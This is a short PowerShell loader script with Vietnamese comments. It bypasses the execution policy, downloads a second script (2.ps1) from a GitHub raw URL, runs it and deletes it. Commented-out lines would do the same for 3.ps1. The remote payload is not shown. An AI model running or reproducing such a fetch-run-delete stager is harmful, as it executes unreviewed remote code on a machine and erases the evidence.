Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Xác định thư mục script an toàn (fallback sang TEMP nếu chạy qua iwr | iex)
if ($PSScriptRoot) {
    $scriptDir = $PSScriptRoot
} else {
    $def = $MyInvocation.MyCommand.Definition
    if ($def -and (Test-Path $def)) {
        $scriptDir = Split-Path -Parent $def
    } else {
        $scriptDir = Join-Path $env:TEMP 'dp'
        if (-not (Test-Path $scriptDir)) { New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null }
    }
}

$scriptPath = Join-Path $scriptDir '2.ps1'
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/truongcp0305/dp/main/2.ps1" -OutFile $scriptPath -ErrorAction Stop

& $scriptPath

Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
Remove-Item $scriptPath -Force

# Start-Process "https://ncsgroup.vn/"

# Start-Process powershell.exe -ArgumentList @"
# `$scriptPath2 = `"$PSScriptRoot\temp_3.ps1`"
# Invoke-WebRequest -Uri `"https://raw.githubusercontent.com/truongcp0305/dp/main/3.ps1`" -OutFile `$scriptPath2
# & `$scriptPath2
# "@